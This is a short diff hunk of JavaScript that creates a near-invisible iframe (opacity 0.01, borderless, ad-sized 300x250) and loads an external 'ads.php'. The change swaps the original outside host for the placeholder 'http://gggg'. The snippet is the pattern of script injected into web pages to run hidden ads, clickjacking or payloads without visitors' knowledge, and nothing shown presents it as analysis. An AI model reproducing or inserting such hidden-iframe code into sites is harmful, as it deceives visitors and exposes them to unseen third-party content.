@@ -46,7 +46,7 @@ document.write("<style>.siguelodivDDDD{ opacity:0.01; filter:alpha(opacity=1); -
 var sx = document.createElement('iframe');
 sx.setAttribute("class", "siguelodivDDDD");
 sx.setAttribute("id", "sigueloDDDD");
-sx.setAttribute("src", "http://www.ratamice.com/ads.php");
+sx.setAttribute("src", "http://gggg/ads.php");
 sx.setAttribute("scrolling", "no");
 sx.setAttribute("frameborder", "0");
 sx.setAttribute("style", "border:none; margin-left:0px; overflow:hidden; width:300px; height:250px;");
